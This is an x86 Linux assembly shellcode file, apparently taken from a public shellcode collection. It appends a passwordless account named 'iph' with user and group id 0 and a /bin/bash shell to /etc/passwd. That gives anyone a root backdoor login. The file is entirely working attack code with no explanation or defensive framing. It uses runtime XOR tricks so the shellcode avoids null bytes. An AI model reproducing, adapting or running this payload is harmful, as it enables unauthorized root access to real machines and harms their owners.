;http://shell-storm.org/shellcode/files/shellcode-798.php

global _start			
section .text

_start:

	mov    al,46	;setgid
	push   ebx
	int    0x80
	xor eax, eax


	jmp short pass

	go:
		pop ebx
		xor byte [ebx +11], 0x42 

	mov    cx,1025
	mov al, 5	;open
	int    0x80
	mov    ebx,eax


	jmp short user

	con:
		pop ecx
		xor byte [ecx +28], 0x41 

	mov al, 4	;write
	mov dl, 28
	int    0x80
	mov al, 6	;close file
	int    0x80
	mov al, 1	;exit
	int    0x80

pass:
	call go
	file: db "/etc/passwdB"

user:
	call con
	auser: db "iph::0:0:IPH:/root:/bin/bashA"
